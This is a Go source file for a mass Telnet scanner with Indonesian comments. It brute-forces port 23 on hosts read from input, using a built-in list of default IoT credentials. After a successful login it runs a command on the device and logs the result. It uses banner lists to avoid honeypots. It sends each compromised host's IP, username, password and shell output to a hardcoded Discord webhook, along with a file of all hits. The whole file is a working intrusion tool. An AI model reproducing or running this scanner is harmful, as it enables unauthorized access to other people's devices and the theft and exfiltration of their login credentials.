package main

import (
    "bufio"
    "bytes"
    "encoding/json"
    "fmt"
    "mime/multipart"
    "net"
    "net/http"
    "os"
    "runtime"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
}

const (
	TELNET_TIMEOUT  = 2 * time.Second
	MAX_WORKERS     = 2000
	PAYLOAD         = "echo https://discord.gg/rNhVsujrd8_BEST_SCANNER"
	STATS_INTERVAL  = 1 * time.Second
	MAX_QUEUE_SIZE  = 100000
	CONNECT_TIMEOUT = 1 * time.Second
	DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1404454771104153741/QbyVNwSnXo7LzTabfyGB1jG3Yq-Ff9ZE9QdPvk0T5mvb8kGFy0FnZfhYMx6u-Eev3ZFK" // ganti
)

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Output   string
    Honeypot bool
    Reasons  []string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
    honeypot         int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
}

// Daftar banner/prompt mencurigakan (honeypot) setelah login (static list)
var BANNERS_AFTER_LOGIN = []string{
    // admin@localhost
    "[admin@localhost ~]$",
    "[admin@localhost ~]#",
    "[admin@localhost tmp]$",
    "[admin@localhost tmp]#",
    "[admin@localhost /]$",
    "[admin@localhost /]#",

    // admin@LocalHost
    "[admin@LocalHost ~]$",
    "[admin@LocalHost ~]#",
    "[admin@LocalHost tmp]$",
    "[admin@LocalHost tmp]#",
    "[admin@LocalHost /]$",
    "[admin@LocalHost /]#",

    // administrator@localhost
    "[administrator@localhost ~]$",
    "[administrator@localhost ~]#",
    "[administrator@localhost tmp]$",
    "[administrator@localhost tmp]#",
    "[administrator@localhost /]$",
    "[administrator@localhost /]#",

    // administrator@LocalHost
    "[administrator@LocalHost ~]$",
    "[administrator@LocalHost ~]#",
    "[administrator@LocalHost tmp]$",
    "[administrator@LocalHost tmp]#",
    "[administrator@LocalHost /]$",
    "[administrator@LocalHost /]#",

    // cisco@localhost
    "[cisco@localhost ~]$",
    "[cisco@localhost ~]#",
    "[cisco@localhost tmp]$",
    "[cisco@localhost tmp]#",
    "[cisco@localhost /]$",
    "[cisco@localhost /]#",

    // cisco@LocalHost
    "[cisco@LocalHost ~]$",
    "[cisco@LocalHost ~]#",
    "[cisco@LocalHost tmp]$",
    "[cisco@LocalHost tmp]#",
    "[cisco@LocalHost /]$",
    "[cisco@LocalHost /]#",

    // pi@raspberrypi
    "[pi@raspberrypi ~]$",
    "[pi@raspberrypi ~]#",
    "[pi@raspberrypi tmp]$",
    "[pi@raspberrypi tmp]#",
    "[pi@raspberrypi /]$",
    "[pi@raspberrypi /]#",

    // pi@localhost (tambahan)
    "[pi@localhost ~]$",
    "[pi@localhost ~]#",
    "[pi@localhost tmp]$",
    "[pi@localhost tmp]#",
    "[pi@localhost /]$",
    "[pi@localhost /]#",

    // pi@LocalHost (tambahan)
    "[pi@LocalHost ~]$",
    "[pi@LocalHost ~]#",
    "[pi@LocalHost tmp]$",
    "[pi@LocalHost tmp]#",
    "[pi@LocalHost /]$",
    "[pi@LocalHost /]#",

    // root@LocalHost
    "[root@LocalHost ~]$",
    "[root@LocalHost ~]#",
    "[root@LocalHost tmp]$",
    "[root@LocalHost tmp]#",
    "[root@LocalHost /]$",
    "[root@LocalHost /]#",

    // root@localhost
    "[root@localhost ~]$",
    "[root@localhost ~]#",
    "[root@localhost tmp]$",
    "[root@localhost tmp]#",
    "[root@localhost /]$",
    "[root@localhost /]#",

    // ubnt@localhost
    "[ubnt@localhost ~]$",
    "[ubnt@localhost ~]#",
    "[ubnt@localhost tmp]$",
    "[ubnt@localhost tmp]#",
    "[ubnt@localhost /]$",
    "[ubnt@localhost /]#",

    // ubnt@LocalHost
    "[ubnt@LocalHost ~]$",
    "[ubnt@LocalHost ~]#",
    "[ubnt@LocalHost tmp]$",
    "[ubnt@LocalHost tmp]#",
    "[ubnt@LocalHost /]$",
    "[ubnt@LocalHost /]#",

    // user@localhost
    "[user@localhost ~]$",
    "[user@localhost ~]#",
    "[user@localhost tmp]$",
    "[user@localhost tmp]#",
    "[user@localhost /]$",
    "[user@localhost /]#",

    // user@LocalHost
    "[user@LocalHost ~]$",
    "[user@LocalHost ~]#",
    "[user@LocalHost tmp]$",
    "[user@LocalHost tmp]#",
    "[user@LocalHost /]$",
    "[user@LocalHost /]#",

    // guest@localhost
    "[guest@localhost ~]$",
    "[guest@localhost ~]#",
    "[guest@localhost tmp]$",
    "[guest@localhost tmp]#",
    "[guest@localhost /]$",
    "[guest@localhost /]#",

    // guest@LocalHost
    "[guest@LocalHost ~]$",
    "[guest@LocalHost ~]#",
    "[guest@LocalHost tmp]$",
    "[guest@LocalHost tmp]#",
    "[guest@LocalHost /]$",
    "[guest@LocalHost /]#",

    // support@localhost
    "[support@localhost ~]$",
    "[support@localhost ~]#",
    "[support@localhost tmp]$",
    "[support@localhost tmp]#",
    "[support@localhost /]$",
    "[support@localhost /]#",

    // support@LocalHost
    "[support@LocalHost ~]$",
    "[support@LocalHost ~]#",
    "[support@LocalHost tmp]$",
    "[support@LocalHost tmp]#",
    "[support@LocalHost /]$",
    "[support@LocalHost /]#",

    // service@localhost
    "[service@localhost ~]$",
    "[service@localhost ~]#",
    "[service@localhost tmp]$",
    "[service@localhost tmp]#",
    "[service@localhost /]$",
    "[service@localhost /]#",

    // service@LocalHost
    "[service@LocalHost ~]$",
    "[service@LocalHost ~]#",
    "[service@LocalHost tmp]$",
    "[service@LocalHost tmp]#",
    "[service@LocalHost /]$",
    "[service@LocalHost /]#",

    // tech@localhost
    "[tech@localhost ~]$",
    "[tech@localhost ~]#",
    "[tech@localhost tmp]$",
    "[tech@localhost tmp]#",
    "[tech@localhost /]$",
    "[tech@localhost /]#",

    // tech@LocalHost
    "[tech@LocalHost ~]$",
    "[tech@LocalHost ~]#",
    "[tech@LocalHost tmp]$",
    "[tech@LocalHost tmp]#",
    "[tech@LocalHost /]$",
    "[tech@LocalHost /]#",

    // telnet@localhost
    "[telnet@localhost ~]$",
    "[telnet@localhost ~]#",
    "[telnet@localhost tmp]$",
    "[telnet@localhost tmp]#",
    "[telnet@localhost /]$",
    "[telnet@localhost /]#",

    // telnet@LocalHost
    "[telnet@LocalHost ~]$",
    "[telnet@LocalHost ~]#",
    "[telnet@LocalHost tmp]$",
    "[telnet@LocalHost tmp]#",
    "[telnet@LocalHost /]$",
    "[telnet@LocalHost /]#",
}

// Daftar indikasi/banner mencurigakan sebelum login (pre-login)
// Gunakan lowercase agar pencarian bisa case-insensitive (input juga diturunkan ke lowercase)
var BANNERS_BEFORE_LOGIN = []string{
    "honeypot",
    "honeypots",
	"Honeypot",
	"Honeypots",
	"HONEYPOT",
	"HONEYPOTS",
    // Common honeypot frameworks and hints
    "cowrie",
    "kippo",
    "dionaea",
    "glastopf",
    "conpot",
    "heralding",
    "snare",
    "tanner",
    "wordpot",
    "shockpot",
    "honeyd",
    "honeytrap",
    "nepenthes",
    "amun",
    "beeswarm",
    "mwcollect",
    "opencanary",
    "canary",
    "thinkst",
    // Monitoring/log stacks often present in honeypot setups
    "splunk",
    "splunkd",
}

// (Static list digunakan, tidak perlu init)

// Discord Embed Structs
type EmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}
type DiscordEmbed struct {
	Title     string       `json:"title,omitempty"`
	Color     int          `json:"color,omitempty"`
	Timestamp string       `json:"timestamp,omitempty"`
	Fields    []EmbedField `json:"fields,omitempty"`
}
type DiscordWebhook struct {
	Username  string         `json:"username,omitempty"`
	AvatarURL string         `json:"avatar_url,omitempty"`
	Embeds    []DiscordEmbed `json:"embeds,omitempty"`
}

// Kirim webhook Discord generik dengan lampiran file opsional
func sendDiscordWebhookWithFileGeneric(title string, color int, host, username, password, output, attachPath string) {
	if DISCORD_WEBHOOK == "" {
		return
	}
	embed := DiscordEmbed{
        Title:     title,
        Color:     color,
		Timestamp: time.Now().Format(time.RFC3339),
		Fields: []EmbedField{
			{"IP:Port", fmt.Sprintf("`%s:23`", host), true},
			{"Username", fmt.Sprintf("`%s`", username), true},
			{"Password", fmt.Sprintf("`%s`", password), true},
			{"Output", fmt.Sprintf("```%s```", output), false},
		},
	}
	payloadStruct := DiscordWebhook{
		Username:  "Telnet Scanner",
		AvatarURL: "https://media.tenor.com/pdX9YTI4_eoAAAAM/cat-cat-with-tongue.gif",
		Embeds:    []DiscordEmbed{embed},
	}
	jsonPayload, _ := json.Marshal(payloadStruct)

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	_ = writer.WriteField("payload_json", string(jsonPayload))

    if attachPath != "" {
        if file, err := os.Open(attachPath); err == nil {
            part, _ := writer.CreateFormFile("file", attachPath)
            if data, err := os.ReadFile(attachPath); err == nil {
                part.Write(data)
            }
            file.Close()
        }
	}
	writer.Close()

	req, err := http.NewRequest("POST", DISCORD_WEBHOOK, &buf)
	if err != nil {
		fmt.Println("[!] Request webhook error:", err)
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("[!] Send webhook error:", err)
		return
	}
	defer resp.Body.Close()
}

// Kompatibilitas belakang (tetap panggil fungsi generik untuk valid)
func sendDiscordWebhookWithFile(host, username, password, output string) {
    sendDiscordWebhookWithFileGeneric("🔥 Valid Telnet Login Found!", 0x00ff00, host, username, password, output, "valid.txt")
}

// Webhook khusus honeypot/hypervisor, dengan alasan
func sendHoneypotWebhook(host, username, password, output string, reasons []string) {
    if DISCORD_WEBHOOK == "" {
        return
    }
    reasonText := ""
    if len(reasons) > 0 {
        reasonText = strings.Join(reasons, ", ")
    } else {
        reasonText = "Unknown"
    }
    embed := DiscordEmbed{
        Title:     "⚠️ Honeypot/Blocked Target",
        Color:     0xff0000,
        Timestamp: time.Now().Format(time.RFC3339),
        Fields: []EmbedField{
            {"IP:Port", fmt.Sprintf("`%s:23`", host), true},
            {"Username", fmt.Sprintf("`%s`", username), true},
            {"Password", fmt.Sprintf("`%s`", password), true},
            {"Reasons", fmt.Sprintf("```%s```", reasonText), false},
            {"Output", fmt.Sprintf("```%s```", output), false},
        },
    }
    payloadStruct := DiscordWebhook{
        Username:  "Telnet Scanner",
        AvatarURL: "https://i.imgur.com/DIvu3F0.png",
        Embeds:    []DiscordEmbed{embed},
    }
    jsonPayload, _ := json.Marshal(payloadStruct)

    var buf bytes.Buffer
    writer := multipart.NewWriter(&buf)
    _ = writer.WriteField("payload_json", string(jsonPayload))

    // Lampirkan honeypot.txt
    if file, err := os.Open("honeypot.txt"); err == nil {
        part, _ := writer.CreateFormFile("file", "honeypot.txt")
        if data, err := os.ReadFile("honeypot.txt"); err == nil {
            part.Write(data)
        }
        file.Close()
    }
    writer.Close()

    req, err := http.NewRequest("POST", DISCORD_WEBHOOK, &buf)
    if err != nil {
        fmt.Println("[!] Request webhook error:", err)
        return
    }
    req.Header.Set("Content-Type", writer.FormDataContentType())
    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        fmt.Println("[!] Send webhook error:", err)
        return
    }
    defer resp.Body.Close()
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{Timeout: CONNECT_TIMEOUT}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
    shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	startTime := time.Now()
    for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, _ := conn.Read(buf)
		if n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)

        // Anti-honeypot via banner (pre-login): cek terhadap daftar (case-insensitive)
        lowerData := bytes.ToLower(data)
        for _, sb := range BANNERS_BEFORE_LOGIN {
            if bytes.Contains(lowerData, bytes.ToLower([]byte(sb))) {
                return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true, Reasons: []string{"BANNER_PRELOGIN:" + sb}}
            }
        }
	}
	conn.Write([]byte(username + "\n"))

	data = data[:0]
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, _ := conn.Read(buf)
		if n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	conn.Write([]byte(password + "\n"))

	data = data[:0]
	startTime = time.Now()
    for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, _ := conn.Read(buf)
		if n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
        if promptCheck(data, shellPrompts...) {
            // Deteksi pola banner dari daftar
            for _, sb := range BANNERS_AFTER_LOGIN {
                if bytes.Contains(data, []byte(sb)) {
                    return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true, Reasons: []string{"BANNER_AFTER_LOGIN:" + sb}}
                }
            }

            conn.Write([]byte(PAYLOAD + "\n"))
            output := s.readCommandOutput(conn)
            return true, CredentialResult{Host: host, Username: username, Password: password, Output: output, Honeypot: false}
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	startTime := time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT/2 {
		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, _ := conn.Read(buf)
		if n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	return string(data)
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()
	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		found := false
        for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				credResult := result.(CredentialResult)
                if credResult.Honeypot {
                    // catat honeypot
                    atomic.AddInt64(&s.honeypot, 1)
                    fh, _ := os.OpenFile("honeypot.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                    fmt.Fprintf(fh, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                    fh.Close()

                    // kirim embed honeypot + file honeypot.txt dengan alasan
                    sendHoneypotWebhook(
                        credResult.Host,
                        credResult.Username,
                        credResult.Password,
                        credResult.Output,
                        credResult.Reasons,
                    )
                } else {
                    // valid credential
                    atomic.AddInt64(&s.valid, 1)
                    f, _ := os.OpenFile("valid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                    fmt.Fprintf(f, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                    f.Close()

                    // kirim embed + file valid.txt
                    sendDiscordWebhookWithFile(credResult.Host, credResult.Username, credResult.Password, credResult.Output)
                }

                found = true
                break
			}
		}
		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()
	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
            fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | honeypot: %d | queue: %d | routines: %d",
				atomic.LoadInt64(&s.scanned),
				atomic.LoadInt64(&s.valid),
				atomic.LoadInt64(&s.invalid),
                atomic.LoadInt64(&s.honeypot),
				atomic.LoadInt64(&s.queueSize),
				runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	fmt.Printf("Initializing scanner (%d / %d)...\n", MAX_WORKERS, MAX_QUEUE_SIZE)
	go s.statsThread()
	stdinDone := make(chan bool)
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			host := line[:len(line)-1]
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				s.hostQueue <- host
			}
		}
		stdinDone <- true
	}()
	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}
	<-stdinDone
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true
}

func main() {
	fmt.Println("\nTelnet Scanner with Discord Webhook")
	scanner := NewTelnetScanner()
	scanner.Run()
}
